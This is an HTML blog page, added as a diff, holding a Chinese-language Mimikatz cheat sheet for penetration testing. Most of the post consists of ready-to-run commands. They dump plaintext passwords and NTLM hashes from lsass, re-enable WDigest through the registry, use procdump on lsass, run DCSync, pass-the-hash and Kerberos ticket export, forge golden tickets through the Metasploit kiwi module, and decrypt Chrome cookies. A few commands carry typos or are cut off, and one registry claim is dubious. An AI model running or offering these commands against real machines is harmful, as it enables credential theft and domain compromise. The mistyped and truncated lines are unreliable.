@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>空空</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Mimikatz    法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试    但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，    渗透必备工具。    需管理员权限或者SYSTEM权限执行 抓取范围：    从lsass.exe 进程中获取windows账户密码    上次关机后登录过的账户密码信息    原因：每次">
+<meta property="og:type" content="article">
+<meta property="og:title" content="空空">
+<meta property="og:url" content="http://example.com/2023/01/09/mimikatz/index.html">
+<meta property="og:site_name" content="空空">
+<meta property="og:description" content="Mimikatz    法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试    但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，    渗透必备工具。    需管理员权限或者SYSTEM权限执行 抓取范围：    从lsass.exe 进程中获取windows账户密码    上次关机后登录过的账户密码信息    原因：每次">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-09T15:12:28.860Z">
+<meta property="article:modified_time" content="2022-12-27T08:12:39.257Z">
+<meta property="article:author" content="两袖空空">
+<meta property="article:tag" content="笔记 , 研究 , 漏洞">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="空空" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">空空</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">两袖空空的随手记</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-mimikatz" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/mimikatz/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.860Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Mimikatz<br>    法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试<br>    但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，<br>    渗透必备工具。<br>    需管理员权限或者SYSTEM权限执行</p>
+<p>抓取范围：<br>    从lsass.exe 进程中获取windows账户密码<br>    上次关机后登录过的账户密码信息<br>    原因：每次关机后lsass.exe进程账户都会被清空</p>
+<p>强制锁屏命令：<br>    rundll32 user32.dll,LockWorkStation</p>
+<p>目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码<br>    可以通过修改注册表的方式抓取明文<br>    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</p>
+<p>命令参数<br>    aaa::aaa 展示所有模块<br>    cls：       清屏<br>    standard：  标准模块，基本命令<br>    crypto：    加密相关模块<br>    sekurlsa：  与证书相关的模块<br>    kerberos：  kerberos模块<br>    privilege： 提权相关模块<br>    process：   进程相关模块<br>    serivce：   服务相关模块<br>    lsadump：   LsaDump模块<br>    ts：        终端服务器模块<br>    event：     事件模块<br>    misc：      杂项模块<br>    token：     令牌操作模块<br>    vault：     Windows 、证书模块<br>    minesweeper：Mine Sweeper模块<br>    net：<br>    dpapi：     DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]<br>    busylight： BusyLight Module<br>    sysenv：    系统环境值模块<br>    sid：       安全标识符模块<br>    iis：       IIS XML配置模块<br>    rpc：       mimikatz的RPC控制<br>    sr98：      用于SR98设备和T5577目标的RF模块<br>    rdm：       RDM（830AL）器件的射频模块<br>    acr：       ACR模块<br>    version：   查看版本<br>    exit：      退出<br>    system::user—–查看当前登录的系统用户<br>    system::computer——-查看计算机名称<br>    process::list——————列出进程<br>    process::suspend 进程名称 —–暂停进程<br>    process::stop 进程名称———结束进程<br>    process::modules –列出系统的核心模块及所在位置<br>    service::list—————列出系统的服务<br>    service::remove———–移除系统的服务<br>    service::start stop 服务名称–启动或停止服务<br>    privilege::list—————列出权限列表<br>    privilege::enable——–激活一个或多个权限<br>    privilege::debug—————–提升权限<br>    nogpo::cmd————打开系统的cmd.exe<br>    nogpo::regedit ———–打开系统的注册表<br>    nogpo::taskmgr————-打开任务管理器<br>    ts::sessions—————–显示当前的会话<br>    ts::processes——显示进程和对应的pid情况等<br>    sekurlsa::wdigest—–获取本地用户信息及密码<br>    sekurlsa::tspkg——获取tspkg用户信息及密码<br>    sekurlsa::logonPasswords–获登陆用户信息及密码</p>
+<p>提升权限<br>    privilege::debug （非管理员不能debug）</p>
+<p>明文抓取<br>        mimikatz # log<br>        mimikatz # privilege::debug<br>        mimikatz # sekurlsa::logonPasswords</p>
+<p>内容解析:<br>    msv：账户对应密码的各种加密协议的密文，如LM、NTLM、SHA1加密的密文<br>    tspkg、wdigest、kerberos：账号对应的明文密码（可能内容不一样）<br>    SSP：最新登录到其他EDR终端的账户和密码</p>
+<p>sekurlsa<br>        sekurlsa::logonPasswords<br>    抓用户NTLM哈希<br>        sekurlsa::msv<br>    加载dmp文件，导出明文密码<br>        sekurlsa::minidump lsass.dmp<br>        sekurlsa::logonpasswords full<br>    导出lsass.exe 进程中所有的票据<br>        sekurlsa::tickets &#x2F;export</p>
+<p>kerberos<br>    列出系统中的票据<br>        kerberos::list<br>        kerberos::tgt<br>    清除系统中的票据<br>        kerberos::purge<br>    导入票据到系统中<br>        kerberos::ptc + 票据路径</p>
+<p>lsadump<br>    查看域hack.com内的指定用户root 的详细信息包含NTLM哈希等（在域控执行）<br>        lsadump::dcsync &#x2F;domain:hack.dom &#x2F;user:root<br>    读取所有域用户的哈希（域控执行）<br>        lsadump::lsa &#x2F;patch<br>    获得sam.hiv 和system.hiv文件的 NTLM Hash<br>        lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<br>    本地SAM文件中读取哈希<br>        token::elevate<br>        lsadump::sam</p>
+<p>pth	生成票据<br>    privilege：：debug<br>    sekurlsa::pth &#x2F;user:test1 &#x2F;domain:test.local &#x2F;ntlm:7ECFFFF0C3548187607A14BAD0F88BB1</p>
+<p>wdigest<br>    WDigest 协议XP中引入，与HTTP一起用与身份认证<br>    多版本windows 默认启用 (xp、03、8.0、12）<br>    补丁KB2871997可以启用活禁用wgigest<br>    意味纯文本密码存储在LSASS进程中<br>        mimikatz # privilege::debug<br>        mimikatz # sekurlsa::wdigest<br>    键值为<br>        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)<br>        UseLogonCredential 值 0 wgigest 不把凭证存于内存中 ，值 1 存于内存中<br>    更改<br>        开启Wdigest Auth<br>            Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br>        关闭Wdigest Auth<br>            Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid<br>注：<br>    如果 PID 为500 补丁KB2871997 会失效<br>    如果执行<br>        reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>        也能直接获取明文密码和哈希</p>
+<p>高版本windows凭证获取 推荐使用 procdump + mimikatz<br>    读取并保存凭证<br>        procdump.exe -accepteula -ma lsass.exe lsa.dmp	<br>    mimikatz 读取密码<br>        mimikatz.exe “log” “sekurlsa::minidump lsa.dmp” “sekurlsa::logonpasswords full” exit &gt;lsa.txt</p>
+<p>MSF使用<br>    kiwi模块 （默认32位 ，64位目标 需先进程迁移到6位进程中）<br>    load kiwi	加载kiwi 模块<br>    help kiwi	查看帮助</p>
+<p>kiwi模块<br>    creds_all：列举所有凭据<br>    creds_kerberos：列举所有kerberos凭据<br>    creds_msv：列举所有msv凭据<br>    creds_ssp：列举所有ssp凭据<br>    creds_tspkg：列举所有tspkg凭据<br>    creds_wdigest：列举所有wdigest凭据<br>    dcsync：通过DCSync检索用户帐户信息<br>    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>    golden_ticket_create：创建黄金票据<br>    kerberos_ticket_list：列举kerberos票据<br>    kerberos_ticket_purge：清除kerberos票据<br>    kerberos_ticket_use：使用kerberos票据<br>    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>    lsa_dump_sam：dump出lsa的SAM<br>    lsa_dump_secrets：dump出lsa的密文<br>    password_change：修改密码<br>    wifi_list：列出当前用户的wifi配置文件<br>    wifi_list_shared：列出共享wifi配置文件&#x2F;编码</p>
+<p>提取Chrome Cookie （1、mimikatz ）<br>    cookie路径<br>    C:\users\ysha\appdata\local\google\chrome\user data\default\cookies</p>
+<p>运行mimikatz.exe 提取cookie<br>    mimikatz.exe<br>    dpapi::chrome &#x2F;in:C:\users\ysha\appdata\local\google\chrome\user data\default\cookies &#x2F;unprotect<br>mimikatz token 模块列出token 模仿system用户token<br>    mimikatz.exe<br>    mimikatz # privilege::debug		获取debug权限<br>    mimikatz # token::elevate	模仿system 用户令牌<br>    mimikatz # token::list	列出令牌<br>    mimikatz # lsadump::sam	获取数据库中密码<br>    mimikatz # token::revert	恢复令牌</p>
+<p>获取chrome 保存的密码（2、webbrowserpassview.exe）<br>    webbrowserpassview.exe </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/mimikatz/" data-id="clcpupano000r5gvpe4ro1omv" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/01/09/mobile/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/01/09/masscan/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/01/09/book/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/book/hexo/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/apt/sources/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 两袖空空<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
